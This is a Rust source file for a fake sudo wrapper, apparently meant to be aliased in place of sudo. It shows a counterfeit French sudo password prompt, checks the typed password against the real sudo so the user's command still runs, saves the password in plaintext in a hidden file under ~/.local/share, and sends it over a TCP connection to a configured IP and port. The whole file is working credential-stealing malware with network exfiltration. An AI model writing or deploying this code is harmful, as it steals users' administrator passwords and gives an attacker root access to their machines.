use dirs::home_dir;
use rpassword;
use serde::{Deserialize, Serialize};
use serde_yml;
use std::env;
use std::io::{stdout, Error, Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use users::get_current_username;

#[derive(Serialize, Deserialize)]
struct Config {
    ip: String,
    port: String,
    password: String,
}

fn getlogin() -> Result<String, ()> {
    let login = get_current_username();
    match login {
        Some(login) => Ok(login.to_string_lossy().to_string()),
        None => Err(()),
    }
}

fn getshell() -> String {
    let shell = env::var("SHELL").unwrap();
    shell
}

fn checkbinsudo() -> bool {
    let path = "/usr/bin/sudo";
    std::path::Path::new(path).exists()
}

fn dropsudosession() -> () {
    let mut cmd = Command::new("sudo")
        .arg("-k")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let _ = cmd.wait().unwrap();
}

fn askpass() -> String {
    let login = getlogin().unwrap();
    print!("[sudo] Mot de passe de {} : ", login);
    stdout().flush().unwrap();
    let password = rpassword::read_password().unwrap();
    password
}

fn run_one_sudo_command(command: &Vec<String>, password: &str) -> Result<(String, String), Error> {
    let mut cmd = match Command::new("sudo")
        .arg("-S")
        .args(command)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(cmd) => cmd,
        Err(e) => {
            return Err(e);
        }
    };

    let stdin = cmd.stdin.as_mut().unwrap();
    stdin
        .write_all((password.to_string() + "\n").as_bytes())
        .unwrap();

    match cmd.wait() {
        Ok(r) => {
            if r.success() {
                let output = cmd.stdout.as_mut().unwrap();
                let mut s = String::new();
                output.read_to_string(&mut s).unwrap();

                Ok((s, "".to_string()))
            } else {
                let output = cmd.stderr.as_mut().unwrap();
                let mut s = String::new();
                output.read_to_string(&mut s).unwrap();

                let error_message = s.splitn(2, ':').collect::<Vec<&str>>()[1].trim();

                match error_message.find("sudo: no password was provided") {
                    Some(_) => Err(Error::new(std::io::ErrorKind::Other, "wrong password")),
                    None => {
                        Ok(("".to_string(), error_message.to_string())) //Le sudo pot se fiche de l'erreur de commande ce n'est pas à lui de la gérer
                    }
                }
            }
        }
        Err(e) => Err(e),
    }
}

fn sudopot(command: &Vec<String>) -> Result<String, ()> {
    let tries: i8 = 3;

    for tryy in 0..tries {
        let password = askpass();
        match run_one_sudo_command(command, &password) {
            Ok(output) => {
                println!("{}", output.0);
                eprintln!("{}", output.1);
                return Ok(password);
            }
            Err(_) => {
                if tryy == tries - 1 {
                    break;
                }
                eprintln!("Désolé, essayez de nouveau.");
            }
        }
    }
    eprintln!("sudo: 3 saisies de mots de passe incorrectes");

    Err(())
}

fn main() {
    let args: Vec<String> = env::args().collect();

    let path: PathBuf = home_dir().unwrap().join(".local/share/.sudopot");

    if !checkbinsudo() {
        let shellname = getshell();
        print!("{shellname} : command not found: sudo");
        return;
    }

    let mut config: Config = match std::fs::File::open(&path) {
        Ok(file) => serde_yml::from_reader(file).unwrap(),
        Err(_) => Config {
            ip: "".to_string(),
            port: "".to_string(),
            password: "".to_string(),
        },
    };

    dropsudosession();

    let command = &args[1..].to_vec();

    if command.len() == 0 {
        match run_one_sudo_command(&vec![], "") {
            Ok(output) => {
                println!("{}", output.0);
                eprintln!("{}", output.1);
            }
            _ => {}
        }
        return;
    }

    match sudopot(command) {
        Ok(password) => {
            if config.password != password {
                config.password = password.clone();
                serde_yml::to_writer(std::fs::File::create(&path).unwrap(), &config).unwrap();
            }
            if config.ip != "" && config.port != "" {
                let mut stream =
                    TcpStream::connect(format!("{}:{}", config.ip, config.port)).unwrap();
                let message = format!("password found : {}", password);
                stream.write(message.as_bytes()).unwrap();
            }
        }
        _ => {}
    }
}